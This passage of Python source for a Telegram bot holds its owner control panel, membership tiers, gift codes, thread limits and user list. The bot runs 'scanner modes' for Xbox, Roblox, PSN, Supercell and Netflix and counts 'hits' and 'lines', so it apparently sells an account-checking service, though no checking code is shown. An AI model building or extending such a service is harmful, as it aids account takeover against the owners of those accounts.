        mk.add(InlineKeyboardButton("🎮 PSN Mode V2",callback_data="set_mode_psnv2"), InlineKeyboardButton("🎮 Supercell Mode",callback_data="set_mode_supercell"))
        mk.add(InlineKeyboardButton("🟥 Netflix Mode",callback_data="set_mode_netflix"), InlineKeyboardButton("⚡ Speed Mode",callback_data="set_mode_speed"))
        mk.add(InlineKeyboardButton("💎 Xbox code Fetcher", callback_data="set_mode_xbox_fetcher"))
        mk.add(InlineKeyboardButton("👑 ALL IN ONE",callback_data="set_mode_allinone",style="success"))
        mk.add(InlineKeyboardButton("🔙 Back to Settings",callback_data="user_settings",style="danger"))
        try:send_with_retry(bot.edit_message_text,ft,c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="owner_panel":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":bot.answer_callback_query(c.id,"⛔ This panel is for the bot owner only.");return
        mk=InlineKeyboardMarkup(row_width=2);mk.add(InlineKeyboardButton("⚙️ Settings",callback_data="owner_settings",style="primary"),InlineKeyboardButton("📢 Broadcast",callback_data="owner_broadcast",style="primary"),InlineKeyboardButton("🔗 Force Subscribe",callback_data="owner_forcesub",style="primary"),InlineKeyboardButton("📊 Full Statistics",callback_data="full_stats",style="primary"),InlineKeyboardButton("👥 Users List",callback_data="users_list",style="primary"),InlineKeyboardButton("⚡ Threads Config",callback_data="threads_config",style="primary"),InlineKeyboardButton("🎁 Manage Gifts",callback_data="manage_gifts",style="success"),InlineKeyboardButton("🛑 Manage Modes",callback_data="manage_modes",style="danger"),InlineKeyboardButton("🔙 Back",callback_data="back_home",style="danger"))
        try:send_with_retry(bot.edit_message_text,"𖠵 <b>👑 Owner Control Panel</b> 𖥻\n\nSelect an option:",c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="manage_modes":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        mk=InlineKeyboardMarkup(row_width=1)
        for mode in [ScannerMode.XBOX.value, ScannerMode.ROBLOX.value, ScannerMode.PSN_V2.value, ScannerMode.SUPERCELL.value, ScannerMode.NETFLIX.value, ScannerMode.SPEED.value, ScannerMode.XBOX_CODE_FETCHER.value, ScannerMode.ALL_IN_ONE.value]:
            status = "🔴 Disabled" if mode in disabled_modes else "🟢 Enabled"
            mk.add(InlineKeyboardButton(f"{mode} [{status}]", callback_data=f"toggle_mode_{mode}"))
        mk.add(InlineKeyboardButton("🔙 Back", callback_data="owner_panel", style="danger"))
        try:send_with_retry(bot.edit_message_text, "<b>🛑 Manage Scanner Modes</b>\n\nClick a mode to enable or disable it. When disabled, no one can use it.", c.message.chat.id, c.message.message_id, reply_markup=mk)
        except Exception:pass
        return
    elif d.startswith("toggle_mode_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        mode = d.replace("toggle_mode_", "")
        if mode in disabled_modes: disabled_modes.remove(mode)
        else: disabled_modes.append(mode)
        save_disabled_modes()
        mk=InlineKeyboardMarkup(row_width=1)
        for m_val in [ScannerMode.XBOX.value, ScannerMode.ROBLOX.value, ScannerMode.PSN_V2.value, ScannerMode.SUPERCELL.value, ScannerMode.NETFLIX.value, ScannerMode.SPEED.value, ScannerMode.XBOX_CODE_FETCHER.value, ScannerMode.ALL_IN_ONE.value]:
            status = "🔴 Disabled" if m_val in disabled_modes else "🟢 Enabled"
            mk.add(InlineKeyboardButton(f"{m_val} [{status}]", callback_data=f"toggle_mode_{m_val}"))
        mk.add(InlineKeyboardButton("🔙 Back", callback_data="owner_panel", style="danger"))
        try:send_with_retry(bot.edit_message_text, "<b>🛑 Manage Scanner Modes</b>\n\nClick a mode to enable or disable it. When disabled, no one can use it.", c.message.chat.id, c.message.message_id, reply_markup=mk)
        except Exception:pass
        return
    elif d=="full_stats":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        act_today=ts_today=th=ts_all=tfh=bc=vc=free_c=0
        for u,udata in db.items():
            if udata.get("last_scan_date")==get_today_utc():act_today+=1;ts_today+=udata.get("today_scans",0)
            th+=udata.get("total_hits",0);ts_all+=udata.get("total_scans",0);tfh+=udata.get("total_free_hits",0)
            if udata.get("membership")==MembershipStatus.BASIC.value:bc+=1
            elif udata.get("membership")==MembershipStatus.VIP.value:vc+=1
            else:free_c+=1
        daily_rewards_today=sum(1 for rd in rewards_db.values() if rd.get("last_daily") and rd.get("last_daily")[:10]==get_today_utc())
        total_codes=len(gift_codes_db);active_codes=sum(1 for cd in gift_codes_db.values() if cd['curr']<cd['max'])
        uptime_seconds=int(time.time()-bot_start_time);uptime_str=str(timedelta(seconds=uptime_seconds)).split('.')[0]
        txt=f"""𖠵 <b>📊 FULL SYSTEM STATISTICS</b> 𖥻
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ <b>👥 USERS OVERVIEW</b>
⌯ Total Users: <code>{len(db)}</code>
⌯ Active Today: <code>{act_today}</code>
⌯ 👑 VIP Users: <code>{vc}</code>
⌯ ⭐ BASIC Users: <code>{bc}</code>
⌯ 🆓 FREE Users: <code>{free_c}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ <b>📈 SCANNING METRICS</b>
⌯ Total Scans: <code>{ts_all}</code>
⌯ Scans Today: <code>{ts_today}</code>
⌯ Total Hits (Premium): <code>{th}</code>
⌯ Total Free Hits: <code>{tfh}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ <b>🎁 REWARDS & CODES</b>
⌯ Daily Rewards Today: <code>{daily_rewards_today}</code>
⌯ Total Gift Codes: <code>{total_codes}</code>
⌯ Active/Usable Codes: <code>{active_codes}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ <b>⚙️ SYSTEM & PERFORMANCE</b>
⌯ Active Scan Jobs: <code>{get_active_jobs_count_free_only()}</code>
⌯ Queue Size: <code>{job_queue.qsize()}</code>
⌯ Ping / Latency: <code>{get_ping()} ms</code>
⌯ Uptime: <code>{uptime_str}</code>
⌯ Bot Status: <code>{'🟢 Running' if BOT_RUNNING else '🔴 Stopped'}</code>
⌯ Auto-Backup: <code>🟢 Active (12H)</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 <b>Date:</b> <code>{datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}</code>"""
        try:send_with_retry(bot.edit_message_text,txt,c.message.chat.id,c.message.message_id,reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back",callback_data="owner_panel",style="danger")))
        except Exception:pass
        return
    elif d=="users_list":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        show_users_list(c.message.chat.id,0,c.message.message_id);return
    elif d=="owner_settings":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        mk=InlineKeyboardMarkup(row_width=2);mk.add(InlineKeyboardButton("🟢 Start Bot" if not BOT_RUNNING else "🔴 Stop Bot",callback_data="toggle_bot",style="success" if not BOT_RUNNING else "danger"),InlineKeyboardButton("💾 Backup Data",callback_data="backup_data",style="primary"),InlineKeyboardButton("📂 Restore Backup",callback_data="restore_backup",style="primary"),InlineKeyboardButton("🔙 Back",callback_data="owner_panel",style="danger"))
        try:send_with_retry(bot.edit_message_text,f"<b>⚙️ Bot Settings</b>\n\nCurrent Status: {'🟢 Running' if BOT_RUNNING else '🔴 Stopped'}\n\nUse the buttons below to manage the bot.",c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="backup_data":
        if uid!="8744777152":return
        try:
            bf=create_backup()
            with open(bf,'rb') as f:send_with_retry(bot.send_document,c.message.chat.id,f,caption=f"✅ <b>Backup Created Successfully!</b>\n\n📅 Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}\n\n⚠️ Keep this .db file safe!")
            bot.answer_callback_query(c.id,"✅ Backup created successfully!")
        except Exception as e:bot.answer_callback_query(c.id,f"❌ Backup failed: {str(e)}")
        return
    elif d=="restore_backup":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        msg=send_with_retry(bot.send_message,c.message.chat.id,"📂 <b>Restore Backup</b>\n\nPlease send the SQLite backup database file (.db) you want to restore.\n\n<i>Send /cancel to abort.</i>");bot.register_next_step_handler(msg,process_restore_backup,c.message.message_id)
        try:send_with_retry(bot.edit_message_text,"📂 <b>Restore Backup Mode</b>\n\nWaiting for backup file...",c.message.chat.id,c.message.message_id)
        except Exception:pass
        return
    elif d=="toggle_bot":
        if uid!="8744777152":return
        BOT_RUNNING=not BOT_RUNNING;st='🟢 Running' if BOT_RUNNING else '🔴 Stopped';bot.answer_callback_query(c.id,f"Bot is now {st}.")
        mk=InlineKeyboardMarkup(row_width=2);mk.add(InlineKeyboardButton("🟢 Start Bot" if not BOT_RUNNING else "🔴 Stop Bot",callback_data="toggle_bot",style="success" if not BOT_RUNNING else "danger"),InlineKeyboardButton("💾 Backup Data",callback_data="backup_data",style="primary"),InlineKeyboardButton("📂 Restore Backup",callback_data="restore_backup",style="primary"),InlineKeyboardButton("🔙 Back",callback_data="owner_panel",style="danger"))
        try:send_with_retry(bot.edit_message_text,f"<b>⚙️ Bot Settings</b>\n\nCurrent Status: {st}\n\nUse the buttons below to manage the bot.",c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="owner_broadcast":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        msg=send_with_retry(bot.send_message,c.message.chat.id,"📢 <b>Send me the message you want to broadcast to all users.</b>\n\n<i>Note: The broadcast system will copy your message exactly (with photos, quotes, bold fonts, etc).</i>\n\nSend /cancel to cancel.");bot.register_next_step_handler(msg,broadcast_message)
        try:send_with_retry(bot.edit_message_text,"📢 <b>Broadcast Mode</b>\n\nWaiting for message...",c.message.chat.id,c.message.message_id)
        except Exception:pass
        return
    elif d=="owner_forcesub":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        mk=InlineKeyboardMarkup(row_width=1)
        for sub in force_subs:
            try:mk.add(InlineKeyboardButton(f"❌ {bot.get_chat(sub.split('|')[0]).title}",callback_data=f"remove_channel_{sub.split('|')[0]}",style="danger"))
            except Exception:mk.add(InlineKeyboardButton(f"❌ {sub}",callback_data=f"remove_channel_{sub}",style="danger"))
        mk.add(InlineKeyboardButton("➕ Add Channel",callback_data="add_sub_channel",style="success"),InlineKeyboardButton("🔙 Back",callback_data="owner_panel",style="danger"))
        try:send_with_retry(bot.edit_message_text,f"<b>🔗 Force Subscribe Channels</b>\n\nCurrent Channels ({len(force_subs)}):\n"+("\n".join([f"• {s.split('|')[0]}" for s in force_subs]) if force_subs else "No channels set yet."),c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d=="threads_config" or d.startswith("threads_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        if d=="threads_free_inc" and CUSTOM_THREADS.get('free',50)<100:CUSTOM_THREADS['free']+=1;save_threads_config()
        elif d=="threads_free_dec" and CUSTOM_THREADS.get('free',50)>1:CUSTOM_THREADS['free']-=1;save_threads_config()
        elif d=="threads_basic_inc" and CUSTOM_THREADS.get('basic',75)<200:CUSTOM_THREADS['basic']+=1;save_threads_config()
        elif d=="threads_basic_dec" and CUSTOM_THREADS.get('basic',75)>1:CUSTOM_THREADS['basic']-=1;save_threads_config()
        elif d=="threads_vip_inc" and CUSTOM_THREADS.get('vip',125)<300:CUSTOM_THREADS['vip']+=1;save_threads_config()
        elif d=="threads_vip_dec" and CUSTOM_THREADS.get('vip',125)>1:CUSTOM_THREADS['vip']-=1;save_threads_config()
        elif d=="threads_reward_inc":CUSTOM_THREADS['daily_reward_max']=CUSTOM_THREADS.get('daily_reward_max',1000)+100;save_threads_config()
        elif d=="threads_reward_dec":CUSTOM_THREADS['daily_reward_max']=max(100,CUSTOM_THREADS.get('daily_reward_max',1000)-100);save_threads_config()
        refresh_threads_config(c.message.chat.id,c.message.message_id);return
    elif d.startswith("user_page_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        show_users_list(c.message.chat.id,int(d.split("_")[-1]),c.message.message_id);return
    elif d.startswith("select_user_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        tu=d.replace("select_user_","")
        if tu in db:show_user_controls(c.message.chat.id,tu,c.message.message_id)
        else:bot.answer_callback_query(c.id,"User not found.")
        return
    elif d.startswith("ban_user_"):
        if uid!="8744777152":return
        tu=d.replace("ban_user_","")
        if tu not in banned_users:banned_users.append(tu);save_db(banned_users,BANNED_DB);bot.answer_callback_query(c.id,f"User {tu} banned.")
        else:bot.answer_callback_query(c.id,"User is already banned.")
        show_user_controls(c.message.chat.id,tu,c.message.message_id);return
    elif d.startswith("unban_user_"):
        if uid!="8744777152":return
        tu=d.replace("unban_user_","")
        if tu in banned_users:banned_users.remove(tu);save_db(banned_users,BANNED_DB);bot.answer_callback_query(c.id,f"User {tu} unbanned.")
        else:bot.answer_callback_query(c.id,"User is not banned.")
        show_user_controls(c.message.chat.id,tu,c.message.message_id);return
    elif d.startswith("set_membership_basic_") or d.startswith("set_membership_vip_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        plan="basic" if "basic" in d else "vip";tu=d.replace(f"set_membership_{plan}_","")
        msg=send_with_retry(bot.send_message,c.message.chat.id,f"Set {plan.upper()} plan duration for user {tu}\n\nEnter duration (e.g., 1h, 1d, 1m):\n\n<i>Send /cancel to cancel.</i>")
        bot.register_next_step_handler(msg,process_set_membership,tu,c.message.message_id,plan)
        try:send_with_retry(bot.edit_message_text,f"Setting {plan.upper()} plan for user {tu}...",c.message.chat.id,c.message.message_id)
        except Exception:pass
        return
    elif d.startswith("remove_membership_"):
        if uid!="8744777152":return
        tu=d.replace("remove_membership_","")
        if tu in db:
            db[tu]["membership"]=MembershipStatus.FREE.value;db[tu]["membership_expiry"]=None
            if db[tu].get("user_threads",50)>CUSTOM_THREADS.get("free",50):db[tu]["user_threads"]=CUSTOM_THREADS.get("free",50)
            if db[tu].get("scanner_mode")==ScannerMode.ALL_IN_ONE.value:db[tu]["scanner_mode"]=ScannerMode.XBOX.value
            save_db(db,DB_FILE);bot.answer_callback_query(c.id,f"Membership removed from user {tu}.")
        else:bot.answer_callback_query(c.id,"User not found.")
        show_user_controls(c.message.chat.id,tu,c.message.message_id);return
    elif d.startswith("add_bonus_") or d.startswith("remove_bonus_") or d.startswith("adjust_limit_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        action="add_bonus" if "add" in d else "remove_bonus" if "remove" in d else "adjust_limit";tu=d.replace(f"{action}_","")
        txt=f"Add bonus lines to user {tu}" if action=="add_bonus" else f"Remove bonus lines from user {tu}" if action=="remove_bonus" else f"Adjust remaining daily limit for user {tu}"
        msg=send_with_retry(bot.send_message,c.message.chat.id,f"{txt}\n\nEnter amount:\n\n<i>Send /cancel to cancel.</i>")
        bot.register_next_step_handler(msg,process_add_bonus if action=="add_bonus" else process_remove_bonus if action=="remove_bonus" else process_adjust_limit,tu,c.message.message_id)
        return
    elif d=="add_sub_channel":
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        msg=send_with_retry(bot.send_message,c.message.chat.id,"<b>➕ Add Force Subscribe Channel</b>\n\nPlease forward a message from the channel you want to add.\n\n<i>Send /cancel to cancel.</i>");bot.register_next_step_handler(msg,get_forwarded_message)
        try:send_with_retry(bot.edit_message_text,"➕ <b>Add Force Subscribe Channel</b>\n\nWaiting for forwarded message...",c.message.chat.id,c.message.message_id)
        except Exception:pass
        return
    elif d.startswith("remove_channel_"):
        bot.answer_callback_query(c.id)
        if uid!="8744777152":return
        cid=d.replace("remove_channel_","");tr=next((s for s in force_subs if s.startswith(cid)),None)
        if tr:force_subs.remove(tr);save_db(force_subs,FORCE_DB);bot.answer_callback_query(c.id,"Channel removed successfully.")
        else:bot.answer_callback_query(c.id,"Channel not found.")
        mk=InlineKeyboardMarkup(row_width=1)
        for sub in force_subs:
            try:mk.add(InlineKeyboardButton(f"❌ {bot.get_chat(sub.split('|')[0]).title}",callback_data=f"remove_channel_{sub.split('|')[0]}",style="danger"))
            except Exception:mk.add(InlineKeyboardButton(f"❌ {sub}",callback_data=f"remove_channel_{sub}",style="danger"))
        mk.add(InlineKeyboardButton("➕ Add Channel",callback_data="add_sub_channel",style="success"),InlineKeyboardButton("🔙 Back",callback_data="owner_panel",style="danger"))
        try:send_with_retry(bot.edit_message_text,f"<b>🔗 Force Subscribe Channels</b>\n\nCurrent Channels ({len(force_subs)}):\n"+("\n".join([f"• {s.split('|')[0]}" for s in force_subs]) if force_subs else "No channels set yet."),c.message.chat.id,c.message.message_id,reply_markup=mk)
        except Exception:pass
        return
    elif d.startswith("job_pause_") or d.startswith("job_resume_") or d.startswith("job_stop_"):
        jid,tj=d.split("_")[-1],next((job for job in current_jobs if job.job_id==d.split("_")[-1] and job.chat_id==uid),None)
        if tj:
            if "pause" in d and tj.status=='Running':
                tj.status='Paused';tj.pause_event.clear();tj.pause_start_time=time.time();threading.Thread(target=auto_resume_job,args=(tj,),daemon=True).start();bot.answer_callback_query(c.id,"⏸ Scan Paused (Auto-resume in 30s)")
            elif "resume" in d and tj.status=='Paused':tj.status='Running';tj.pause_event.set();tj.pause_start_time=None;bot.answer_callback_query(c.id,"▶️ Scan Resumed")
            elif "stop" in d and tj.status in ['Running','Paused']:tj.status='Stopped';tj.stop_flag=True;tj.pause_event.set();unpin_scan_message(tj.chat_id,tj.msg_id);bot.answer_callback_query(c.id,"⏹ Scan Stopped")
        else:bot.answer_callback_query(c.id,"⚠️ No active scan found.")

def refresh_threads_config(chat_id,message_id):
    mk=InlineKeyboardMarkup(row_width=3)
    mk.add(InlineKeyboardButton("FREE -",callback_data="threads_free_dec",style="danger"),InlineKeyboardButton(f"{CUSTOM_THREADS.get('free',50)}",callback_data="none",style="primary"),InlineKeyboardButton("FREE +",callback_data="threads_free_inc",style="success"))
    mk.add(InlineKeyboardButton("BASIC -",callback_data="threads_basic_dec",style="danger"),InlineKeyboardButton(f"{CUSTOM_THREADS.get('basic',75)}",callback_data="none",style="primary"),InlineKeyboardButton("BASIC +",callback_data="threads_basic_inc",style="success"))
    mk.add(InlineKeyboardButton("VIP -",callback_data="threads_vip_dec",style="danger"),InlineKeyboardButton(f"{CUSTOM_THREADS.get('vip',125)}",callback_data="none",style="primary"),InlineKeyboardButton("VIP +",callback_data="threads_vip_inc",style="success"))
    mk.add(InlineKeyboardButton("Reward Max -",callback_data="threads_reward_dec",style="danger"),InlineKeyboardButton(f"{CUSTOM_THREADS.get('daily_reward_max',1000)}",callback_data="none",style="primary"),InlineKeyboardButton("Reward Max +",callback_data="threads_reward_inc",style="success"))
    mk.add(InlineKeyboardButton("🔙 Back to Panel",callback_data="owner_panel",style="danger"))
    try:send_with_retry(bot.edit_message_text,f"<b>⚙️ Threads & Rewards Configuration</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<b>FREE Max Threads:</b> <code>{CUSTOM_THREADS.get('free',50)}</code>\n<b>BASIC Max Threads:</b> <code>{CUSTOM_THREADS.get('basic',75)}</code>\n<b>VIP Max Threads:</b> <code>{CUSTOM_THREADS.get('vip',125)}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<b>Max Daily Reward Amount:</b> <code>{CUSTOM_THREADS.get('daily_reward_max',1000)} lines</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nModify the variables directly using the buttons below.",chat_id,message_id,reply_markup=mk)
    except Exception:pass

def process_redeem_code(m):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    code=m.text.strip().upper()
    if code not in gift_codes_db:send_with_retry(bot.send_message,m.chat.id,"❌ <b>Invalid or expired code!</b>");return
    cdata=gift_codes_db[code]
    if cdata['curr']>=cdata['max']:send_with_retry(bot.send_message,m.chat.id,"❌ <b>This code has reached its maximum usage limit!</b>");return
    uid=str(m.chat.id)
    user_reward_data=rewards_db.get(uid,{"last_daily":None,"claimed_codes":[],"temp_lines":0,"temp_lines_expiry":None})
    if code in user_reward_data["claimed_codes"]:send_with_retry(bot.send_message,m.chat.id,"⚠️ <b>You have already redeemed this code!</b>");return
    rtype,rval=cdata['type'],cdata['value']
    if rtype=="lines":
        now=datetime.now(timezone.utc)
        current_temp=user_reward_data.get("temp_lines",0)
        exp=user_reward_data.get("temp_lines_expiry")
        if exp and now>datetime.fromisoformat(exp):current_temp=0
        user_reward_data["temp_lines"]=current_temp+int(rval)
        user_reward_data["temp_lines_expiry"]=(now+timedelta(days=1)).isoformat()
        msg_text=f"✅ <b>Code Redeemed!</b>\nYou received <b>+{rval} temporary lines</b> (Valid for 24H)."
    elif rtype in ["basic","vip"]:
        dur=parse_time_duration(rval)
        if not dur:send_with_retry(bot.send_message,m.chat.id,"❌ <b>Error in code duration!</b>");return
        ed=datetime.now(timezone.utc)+dur
        db[uid]["membership"]=MembershipStatus.BASIC.value if rtype=="basic" else MembershipStatus.VIP.value
        db[uid]["membership_expiry"]=ed.isoformat()
        db[uid]["today_scans"]=0;db[uid]["last_scan_date"]=get_today_utc()
        if db[uid].get("user_threads",50)>get_max_threads_for_user(db[uid]):db[uid]["user_threads"]=get_max_threads_for_user(db[uid])
        plan_name="⭐ BASIC" if rtype=="basic" else "👑 VIP"
        msg_text=f"✅ <b>Code Redeemed!</b>\nYour account has been upgraded to <b>{plan_name}</b> for {rval}!"
    cdata['curr']+=1;user_reward_data["claimed_codes"].append(code);rewards_db[uid]=user_reward_data
    save_db(db,DB_FILE);save_db_rewards();save_db_gift_codes();send_with_retry(bot.send_message,m.chat.id,msg_text)
    user,_=get_user(m.chat.id)
    try:send_with_retry(bot.send_message, "8744777152", f"🎟 <b>Gift Code Redeemed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 User ID: <code>{uid}</code>\n🔗 Username: @{user.get('username') or 'None'}\n🎟 Code: <code>{code}</code>\n🎁 Reward: <b>{rval} ({rtype})</b>\n⏰ Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception:pass

def process_gen_code_step1(m,rtype):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    try:
        uses=int(m.text.strip())
        if uses<1:raise ValueError
    except Exception:send_with_retry(bot.send_message,m.chat.id,"❌ Invalid number. Operation cancelled.");return
    if rtype=="lines":
        txt="<b>⚙️ 𝗖𝗢𝗗𝗘 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 (𝗦𝘁𝗲𝗽 𝟮/𝟮)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📈 <b>Reward Amount Setup</b>\n\n<i>Enter the amount of extra lines to gift (Valid for 24H).</i>\n📌 <b>Example:</b> <code>5000</code>\n\n💬 <b>Action:</b> Send amount or /cancel"
    else:
        txt="<b>⚙️ 𝗖𝗢𝗗𝗘 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 (𝗦𝘁𝗲𝗽 𝟮/𝟮)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏱ <b>Duration Setup</b>\n\n<i>Enter the duration for this subscription gift.</i>\n📌 <b>Format:</b> <code>1h</code> (Hour), <code>1d</code> (Day), <code>1m</code> (Month)\n\n💬 <b>Action:</b> Send duration or /cancel"
    msg=send_with_retry(bot.send_message,m.chat.id,txt)
    bot.register_next_step_handler(msg,process_gen_code_step2,rtype,uses)

def process_gen_code_step2(m,rtype,uses):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    rval=m.text.strip()
    if rtype in ["basic","vip"] and not parse_time_duration(rval):send_with_retry(bot.send_message,m.chat.id,"❌ Invalid duration format.");return
    if rtype=="lines" and not rval.isdigit():send_with_retry(bot.send_message,m.chat.id,"❌ Invalid lines amount.");return
    code="GIF-"+''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",k=8))
    gift_codes_db[code]={"type":rtype,"value":rval,"max":uses,"curr":0};save_db_gift_codes()
    plan_name="Extra Lines (24H)" if rtype=="lines" else ("⭐ BASIC" if rtype=="basic" else "👑 VIP")
    res_msg=f"""✅ <b>Gift Code Generated!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎟 <b>Code:</b> <code>{code}</code>
🎁 <b>Reward:</b> {plan_name} ({rval})
👥 <b>Max Uses:</b> {uses}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
➪ <b>How to use:</b>
︙ <i>Go to Bot settings or Rewards menu.</i>
︙ <i>Click "Redeem Gift Code".</i>
︙ <i>Send the code exactly as shown above.</i>

🌐 <b>Bot Link:</b> @{BOT_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    send_with_retry(bot.send_message,m.chat.id,res_msg)

def process_set_user_threads(m,orig_id):
    try:bot.clear_step_handler_by_chat_id(m.chat.id)
    except Exception:pass
    if m.text and (m.text.startswith('/') or m.text.lower()=="/cancel"):cancel_current_operation(m);return
    user,_=get_user(m.chat.id);mem=user.get("membership",MembershipStatus.FREE.value);ma=CUSTOM_THREADS.get("basic",75) if mem==MembershipStatus.BASIC.value else CUSTOM_THREADS.get("vip",125) if mem==MembershipStatus.VIP.value else CUSTOM_THREADS.get("free",50)
    try:
        nt=int(m.text.strip())
        if nt<1 or nt>ma:send_with_retry(bot.send_message,m.chat.id,"❌ Thread count must be at least 1." if nt<1 else f"❌ Your plan ({mem}) allows a maximum of {ma} threads.")
        else:user["user_threads"]=nt;save_db(db,DB_FILE);send_with_retry(bot.send_message,m.chat.id,f"✅ Thread count updated to <code>{nt}</code> for your account.");send_welcome(m)
    except ValueError:send_with_retry(bot.send_message,m.chat.id,"❌ Invalid number. Please enter a valid number.")

def show_users_list(chat_id,page,message_id=None):
    users = sorted(db.items(), key=lambda item: (item[1].get('last_scan_date', '1970-01-01'), item[1].get('today_scans', 0), item[1].get('total_scans', 0)), reverse=True)
    tp = max(1, (len(users) + 9) // 10)
    page = max(0, min(page, tp - 1))
    cu = users[page * 10:(page + 1) * 10]
    txt = f"<b>👥 Users List | Page {page+1}/{tp}</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, udata in cu:
        un = udata.get('username')
        un_str = f"@{un}" if un and un not in ['None', 'Unknown'] else "No Username"
        plan = udata.get('membership', MembershipStatus.FREE.value).split()[0]
        hits = udata.get('total_hits', 0)
        scans = udata.get('total_scans', 0)
        last = udata.get('last_scan_date', 'Unknown')
        status = '🔴 Ban' if uid in banned_users else '🟢 Act'
        txt += f"👤 <b>{uid}</b> | {un_str}\n"
        txt += f"└ {status} | 👑 {plan} | 💎 Hits: {hits} | 📊 Scans: {scans} | 📅 Last: {last}\n\n"
    mk = InlineKeyboardMarkup(row_width=2)
    user_btns = []
    for uid, udata in cu:
        un = udata.get('username', 'No username')
        btn_text = f"👤 {un if un not in [None, 'None', 'Unknown'] else uid[:8]}"
        user_btns.append(InlineKeyboardButton(btn_text, callback_data=f"select_user_{uid}", style="primary"))
    for i in range(0, len(user_btns), 2):
        if i + 1 < len(user_btns): mk.row(user_btns[i], user_btns[i+1])
        else: mk.row(user_btns[i])
    nav_btns = []
    if page > 0: nav_btns.append(InlineKeyboardButton("◀️ Prev", callback_data=f"user_page_{page-1}", style="primary"))
    nav_btns.append(InlineKeyboardButton(f"{page+1}/{tp}", callback_data="none", style="primary"))
    if page < tp - 1: nav_btns.append(InlineKeyboardButton("Next ▶️", callback_data=f"user_page_{page+1}", style="primary"))
    if nav_btns: mk.row(*nav_btns)
    mk.add(InlineKeyboardButton("🔙 Back to Panel", callback_data="owner_panel", style="danger"))
    if message_id:
        try: send_with_retry(bot.edit_message_text, txt, chat_id, message_id, reply_markup=mk)
        except Exception: pass
    else: send_with_retry(bot.send_message, chat_id, txt, reply_markup=mk)

def show_user_controls(chat_id,tu,msg_id):
    udata,dl=db.get(tu,{}),get_user_daily_limit(tu);ib,mem,exp=tu in banned_users,udata.get("membership",MembershipStatus.FREE.value),udata.get("membership_expiry",None);expt="N/A"
    if exp:
        try:expt=datetime.fromisoformat(exp).strftime("%Y-%m-%d %H:%M:%S")
        except Exception:expt="Invalid"
    last_scan_str="Not yet examined"
    lst=udata.get("last_scan_time")
    if lst:
        try:
            lst_dt=datetime.fromisoformat(lst)
            if lst_dt.tzinfo is None:lst_dt=lst_dt.replace(tzinfo=timezone.utc)
            diff=datetime.now(timezone.utc)-lst_dt
            total_mins=int(diff.total_seconds()//60)
            if total_mins<60:last_scan_str=f"{total_mins} 1 minute ago" if total_mins>1 else "A little while ago"
            elif total_mins<1440:last_scan_str=f"{total_mins//60} An hour has passed"
            else:last_scan_str=f"{total_mins//1440} A day has passed"
        except Exception:last_scan_str=udata.get("last_scan_date","Unknown")
    xbox_h=udata.get("xbox_hits",0);roblox_h=udata.get("roblox_hits",0)
    supercell_h=udata.get("supercell_hits",0);netflix_h=udata.get("netflix_hits",0)
    psn_h=udata.get("psn_hits",0);speed_h=udata.get("speed_hits",0)
    total_files=udata.get("total_files",0)
    cur_mode=udata.get("scanner_mode",ScannerMode.XBOX.value)
    cur_threads=udata.get("user_threads",50)
    txt=(
        f"<b>👤 User Control Panel</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>🆔 ID:</b> <code>{tu}</code>\n"
        f"<b>👤 Name:</b> {udata.get('first_name','Unknown')}\n"
